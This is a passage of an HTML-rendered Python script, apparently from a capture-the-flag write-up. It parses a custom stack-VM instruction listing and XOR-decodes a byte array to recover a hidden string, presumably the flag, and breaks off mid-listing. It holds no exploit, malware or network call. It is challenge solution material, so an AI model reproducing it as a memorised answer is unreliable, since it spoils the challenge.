class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">output = <span class="string">&#x27;&#x27;&#x27;push 48</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">push 176</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">push 198</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 2</span></span><br><span class="line"><span class="string">push 66</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 2</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 2</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 3</span></span><br><span class="line"><span class="string">push 199</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 3</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 3</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 4</span></span><br><span class="line"><span class="string">push 170</span></span><br><span class="line"><span class="string">push 14</span></span><br><span class="line"><span class="string">load 4</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 4</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 5</span></span><br><span class="line"><span class="string">push 32</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 5</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 5</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 6</span></span><br><span class="line"><span class="string">push 31</span></span><br><span class="line"><span class="string">push 14</span></span><br><span class="line"><span class="string">load 6</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 6</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 7</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 7</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 7</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 8</span></span><br><span class="line"><span class="string">push 26</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 8</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 8</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 9</span></span><br><span class="line"><span class="string">push 89</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 9</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 9</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 10</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 17</span></span><br><span class="line"><span class="string">load 10</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 10</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 11</span></span><br><span class="line"><span class="string">push 119</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 11</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 11</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 12</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 17</span></span><br><span class="line"><span class="string">load 12</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 12</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 13</span></span><br><span class="line"><span class="string">push 90</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 13</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 13</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 14</span></span><br><span class="line"><span class="string">push 104</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 14</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 14</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 15</span></span><br><span class="line"><span class="string">push 174</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 15</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 15</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 16</span></span><br><span class="line"><span class="string">push 146</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 16</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 16</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 17</span></span><br><span class="line"><span class="string">push 179</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 17</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 17</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 18</span></span><br><span class="line"><span class="string">push 67</span></span><br><span class="line"><span class="string">push 15</span></span><br><span class="line"><span class="string">load 18</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 18</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 19</span></span><br><span class="line"><span class="string">push 73</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 19</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 19</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 20</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">push 12</span></span><br><span class="line"><span class="string">load 20</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 20</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 21</span></span><br><span class="line"><span class="string">push 92</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 21</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 21</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 22</span></span><br><span class="line"><span class="string">push 170</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 22</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 22</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 23</span></span><br><span class="line"><span class="string">push 160</span></span><br><span class="line"><span class="string">push 9</span></span><br><span class="line"><span class="string">load 23</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 23</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 24</span></span><br><span class="line"><span class="string">push 166</span></span><br><span class="line"><span class="string">push 15</span></span><br><span class="line"><span class="string">load 24</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 24</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 25</span></span><br><span class="line"><span class="string">push 47</span></span><br><span class="line"><span class="string">push 8</span></span><br><span class="line"><span class="string">load 25</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 25</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 26</span></span><br><span class="line"><span class="string">push 155</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 26</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 26</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 27</span></span><br><span class="line"><span class="string">push 115</span></span><br><span class="line"><span class="string">push 9</span></span><br><span class="line"><span class="string">load 27</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 27</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 28</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 28</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 28</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 29</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">push 12</span></span><br><span class="line"><span class="string">load 29</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 29</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 30</span></span><br><span class="line"><span class="string">push 42</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 30</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 30</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 31</span></span><br><span class="line"><span class="string">push 96</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 31</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 31</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 32</span></span><br><span class="line"><span class="string">push 72</span></span><br><span class="line"><span class="string">push 7</span></span><br><span class="line"><span class="string">load 32</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 32&#x27;&#x27;&#x27;</span></span><br><span class="line">pattern = <span class="string">r&#x27;push\s+(\d+)&#x27;</span></span><br><span class="line">final = [<span class="number">255</span>, <span class="number">149</span>, <span class="number">26</span>, <span class="number">146</span>, <span class="number">200</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">36</span>, <span class="number">222</span>, <span class="number">185</span>, <span class="number">240</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">215</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">178</span>, <span class="number">46</span>, <span class="number">205</span>, <span class="number">209</span>,</span><br><span class="line">         <span class="number">214</span>, <span class="number">83</span>, <span class="number">233</span>, <span class="number">34</span>, <span class="number">82</span>, <span class="number">74</span>, <span class="number">67</span>, <span class="number">36</span>, <span class="number">204</span>]</span><br><span class="line">matches = re.findall(pattern, output)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(matches))</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(final)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((final[i] ^ (<span class="built_in">int</span>(matches[i * <span class="number">3</span> + <span class="number">1</span>]))) - <span class="built_in">int</span>(matches[i * <span class="number">3</span> + <span class="number">2</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">o2 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 176</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 59</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 139</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 198</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 67</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 133</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">store 2</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 66</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 2</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 55</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 117</span></span><br><span class="line"><span class="string">store 2</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">store 3</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 199</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 3</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 69</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 130</span></span><br><span class="line"><span class="string">store 3</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">store 4</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 170</span></span><br><span class="line"><span class="string">push 14</span></span><br><span class="line"><span class="string">load 4</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 66</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 232</span></span><br><span class="line"><span class="string">store 4</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 53</span></span><br><span class="line"><span class="string">store 5</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 32</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 5</span></span><br><span class="line"><span class="string">push 53</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 66</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 98</span></span><br><span class="line"><span class="string">store 5</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 54</span></span><br><span class="line"><span class="string">store 6</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 31</span></span><br><span class="line"><span class="string">push 14</span></span><br><span class="line"><span class="string">load 6</span></span><br><span class="line"><span class="string">push 54</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 68</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 91</span></span><br><span class="line"><span class="string">store 6</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 55</span></span><br><span class="line"><span class="string">store 7</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 7</span></span><br><span class="line"><span class="string">push 55</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 73</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 117</span></span><br><span class="line"><span class="string">store 7</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 56</span></span><br><span class="line"><span class="string">store 8</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 26</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 8</span></span><br><span class="line"><span class="string">push 56</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 69</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 95</span></span><br><span class="line"><span class="string">store 8</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 57</span></span><br><span class="line"><span class="string">store 9</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 89</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 9</span></span><br><span class="line"><span class="string">push 57</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 75</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">store 9</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 10</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 17</span></span><br><span class="line"><span class="string">load 10</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 65</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 125</span></span><br><span class="line"><span class="string">store 10</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">store 11</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 119</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 11</span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 68</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">store 11</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">store 12</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 17</span></span><br><span class="line"><span class="string">load 12</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 67</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 127</span></span><br><span class="line"><span class="string">store 12</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">store 13</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 90</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 13</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 56</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 98</span></span><br><span class="line"><span class="string">store 13</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">store 14</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 104</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 14</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 65</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">store 14</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 53</span></span><br><span class="line"><span class="string">store 15</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 174</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 15</span></span><br><span class="line"><span class="string">push 53</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 72</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 230</span></span><br><span class="line"><span class="string">store 15</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 54</span></span><br><span class="line"><span class="string">store 16</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 146</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 16</span></span><br><span class="line"><span class="string">push 54</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 65</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 211</span></span><br><span class="line"><span class="string">store 16</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 55</span></span><br><span class="line"><span class="string">store 17</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 179</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 17</span></span><br><span class="line"><span class="string">push 55</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 143</span></span><br><span class="line"><span class="string">store 17</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 56</span></span><br><span class="line"><span class="string">store 18</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 67</span></span><br><span class="line"><span class="string">push 15</span></span><br><span class="line"><span class="string">load 18</span></span><br><span class="line"><span class="string">push 56</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span 